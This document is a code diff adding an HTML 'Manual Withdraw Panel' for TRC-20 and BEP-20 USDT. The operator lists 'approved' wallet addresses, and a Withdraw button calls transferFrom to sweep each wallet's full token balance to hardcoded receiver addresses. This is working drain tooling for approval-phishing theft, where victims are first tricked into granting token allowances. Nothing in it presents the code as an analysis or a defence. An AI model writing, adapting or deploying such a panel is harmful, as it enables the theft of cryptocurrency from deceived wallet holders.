@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Manual Withdraw Panel</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb"></script>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      padding: 40px;
+    }
+    h1 {
+      color: #00ffcc;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      padding: 14px;
+      border: 1px solid #444;
+    }
+    button {
+      padding: 10px 16px;
+      background: #00ffcc;
+      color: #000;
+      border: none;
+      cursor: pointer;
+    }
+    input {
+      padding: 8px;
+      width: 350px;
+      background: #222;
+      color: #fff;
+      border: 1px solid #555;
+    }
+  </style>
+</head>
+<body>
+  <h1>Manual Withdraw Tool (TRC-20 + BEP-20)</h1>
+
+  <h3>Enter Approved Wallet Address</h3>
+  <input type="text" id="walletInput" placeholder="Enter approved wallet address">
+  <select id="networkSelect">
+    <option value="trc">TRC-20 (TronLink)</option>
+    <option value="bep">BEP-20 (MetaMask/SafePal)</option>
+  </select>
+  <button onclick="addWallet()">Add Wallet</button>
+
+  <table id="walletTable">
+    <thead>
+      <tr>
+        <th>Wallet Address</th>
+        <th>Network</th>
+        <th>Action</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <script>
+    const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+    const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+    const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
+
+    const ABI = [
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "sender", "type": "address" }, { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
+      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
+    ];
+
+    function addWallet() {
+      const address = document.getElementById("walletInput").value.trim();
+      const network = document.getElementById("networkSelect").value;
+      if (!address) return alert("Enter a valid wallet address");
+      
+      const tbody = document.querySelector("#walletTable tbody");
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td>${address}</td>
+        <td>${network.toUpperCase()}</td>
+        <td><button onclick="withdraw('${network}', '${address}')">Withdraw</button></td>
+      `;
+      tbody.appendChild(row);
+      document.getElementById("walletInput").value = "";
+    }
+
+    async function withdraw(network, address) {
+      if (network === "trc") {
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) return alert("Connect TronLink");
+        const tronWeb = window.tronWeb;
+        const contract = await tronWeb.contract(ABI, TRC20_USDT);
+        const balance = await contract.methods.balanceOf(address).call();
+        const result = await contract.methods.transferFrom(address, RECEIVER_TRC, balance).send();
+        alert("TRC-20 Manual Withdrawal Complete!");
+      }
+
+      else if (network === "bep") {
+        if (!window.ethereum) return alert("Connect MetaMask");
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+        const contract = new web3.eth.Contract(ABI, BEP20_USDT);
+        const balance = await contract.methods.balanceOf(address).call();
+        await contract.methods.transferFrom(address, RECEIVER_BEP, balance).send({ from: sender });
+        alert("BEP-20 Manual Withdrawal Complete!");
+      }
+    }
+  </script>
+</body>
+</html>
